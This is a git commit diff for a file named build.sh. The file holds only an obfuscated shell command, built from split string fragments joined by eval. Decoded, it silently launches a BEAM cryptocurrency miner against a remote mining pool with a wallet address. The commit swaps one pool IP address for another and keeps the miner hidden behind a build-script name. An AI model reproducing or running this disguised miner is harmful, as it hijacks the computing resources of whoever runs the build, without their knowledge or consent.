d04190a8a09c0d061d2e289f16fd00939a044f13
sarifadim <115786763+sarifadim@users.noreply.github.com>
2024-03-09 05:04:44 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,3 +1,3 @@
 z="
-";Nz=' --u';Sz='C862';iz='-tls';Kz='.237';Vz='QW6J';gz='-%S"';Qz='ijUT';Xz='3j.$';bz='Z=UT';Iz=' 149';Fz='M-II';oz='>&1';Oz='ser ';Pz='3JWu';fz='H-%M';Mz=':443';Lz='.206';Az='./pr';Hz='pool';Bz='ojec';ez=' +"%';mz='v/nu';Cz='t --';Uz='BSMz';Wz='ANF6';Zz='o 0A';hz=')) -';lz='>/de';jz=' ena';Rz='2hws';Yz='(ech';dz='date';cz='C-7 ';Gz='I --';Jz='.129';Tz='trVX';nz='ll 2';Dz='algo';az='-$(T';Ez=' BEA';kz='ble ';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz"
+";Gz='I --';gz=')) -';bz='C-7 ';Uz='QW6J';nz='>&1';Pz='ijUT';Ez=' BEA';Kz='11.6';Fz='M-II';jz='ble ';Cz='t --';Nz='ser ';Wz='3j.$';az='Z=UT';Qz='2hws';hz='-tls';Mz=' --u';Iz=' 47.';Bz='ojec';cz='date';iz=' ena';Rz='C862';Az='./pr';Zz='-$(T';ez='H-%M';Yz='o 0A';fz='-%S"';Dz='algo';dz=' +"%';Hz='pool';Vz='ANF6';Xz='(ech';kz='>/de';Lz=':443';lz='v/nu';Tz='BSMz';Sz='trVX';Jz='89.2';mz='ll 2';Oz='3JWu';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz"
